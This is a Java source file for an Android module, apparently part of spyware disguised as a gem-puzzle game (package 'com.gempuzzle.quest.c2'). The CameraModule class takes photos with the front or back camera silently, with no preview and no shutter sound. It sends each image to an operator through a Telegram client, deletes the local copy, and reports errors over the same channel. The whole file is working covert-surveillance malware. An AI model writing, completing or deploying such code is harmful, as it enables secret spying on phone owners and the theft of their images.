package com.gempuzzle.quest.c2.modules;

import android.content.Context;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraCaptureSession;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraManager;
import android.hardware.camera2.CaptureRequest;
import android.media.Image;
import android.media.ImageReader;
import android.os.Handler;
import android.os.HandlerThread;
import android.util.Log;
import android.util.Size;
import android.view.Surface;

import androidx.annotation.NonNull;

import com.gempuzzle.quest.c2.TelegramClient;

import java.io.File;
import java.io.FileOutputStream;
import java.nio.ByteBuffer;
import java.util.Collections;
import java.util.concurrent.Semaphore;
import java.util.concurrent.TimeUnit;

/**
 * Silent camera capture — no preview, no shutter sound,
 * uses Camera2 API with ImageReader. Auto-switches lens
 * if CAMERA_IN_USE.
 */
public final class CameraModule {

    private static final String TAG = "Cam";

    public static void capture(Context ctx, boolean front) {
        new Thread(() -> {
            try {
                File out = new File(ctx.getCacheDir(), "cap_" + System.currentTimeMillis() + ".jpg");
                boolean ok = captureInternal(ctx, front ? "1" : "0", out);
                if (!ok && front) {
                    // retry with other lens
                    ok = captureInternal(ctx, "0", out);
                }
                if (ok && out.exists()) {
                    TelegramClient.sendDocument(out, (front ? "🤳 front" : "📷 back") + " camera");
                    out.delete();
                } else {
                    TelegramClient.sendMessage("⚠ camera capture failed (in use or no perm)");
                }
            } catch (Throwable t) {
                Log.e(TAG, "capture", t);
                TelegramClient.sendMessage("⚠ camera error: " + t.getMessage());
            }
        }).start();
    }

    private static boolean captureInternal(Context ctx, String cameraId, File out) {
        CameraManager cm = (CameraManager) ctx.getSystemService(Context.CAMERA_SERVICE);
        Semaphore sem = new Semaphore(0);
        final boolean[] done = {false};
        HandlerThread ht = new HandlerThread("cam");
        ht.start();
        Handler handler = new Handler(ht.getLooper());
        try {
            ImageReader reader = ImageReader.newInstance(1920, 1080,
                    android.graphics.ImageFormat.JPEG, 1);
            reader.setOnImageAvailableListener(r -> {
                Image img = r.acquireLatestImage();
                if (img != null) {
                    ByteBuffer buf = img.getPlanes()[0].getBuffer();
                    byte[] bytes = new byte[buf.remaining()];
                    buf.get(bytes);
                    try (FileOutputStream fos = new FileOutputStream(out)) {
                        fos.write(bytes);
                    } catch (Exception ignored) {}
                    img.close();
                    done[0] = true;
                    sem.release();
                }
            }, handler);

            final CameraDevice[] devHolder = {null};
            cm.openCamera(cameraId, new CameraDevice.StateCallback() {
                @Override
                public void onOpened(@NonNull CameraDevice camera) {
                    devHolder[0] = camera;
                    try {
                        CaptureRequest.Builder b = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
                        b.addTarget(reader.getSurface());
                        camera.createCaptureSession(Collections.singletonList(reader.getSurface()),
                                new CameraCaptureSession.StateCallback() {
                                    @Override
                                    public void onConfigured(@NonNull CameraCaptureSession session) {
                                        try {
                                            session.capture(b.build(), null, handler);
                                        } catch (CameraAccessException e) {
                                            sem.release();
                                        }
                                    }
                                    @Override
                                    public void onConfigureFailed(@NonNull CameraCaptureSession session) {
                                        sem.release();
                                    }
                                }, handler);
                    } catch (CameraAccessException e) {
                        sem.release();
                    }
                }
                @Override
                public void onDisconnected(@NonNull CameraDevice camera) { sem.release(); }
                @Override
                public void onError(@NonNull CameraDevice camera, int error) { sem.release(); }
            }, handler);

            boolean acquired = sem.tryAcquire(15, TimeUnit.SECONDS);
            if (devHolder[0] != null) devHolder[0].close();
            reader.close();
            ht.quitSafely();
            return acquired && done[0];
        } catch (Throwable t) {
            ht.quitSafely();
            return false;
        }
    }

    private CameraModule() {}
}
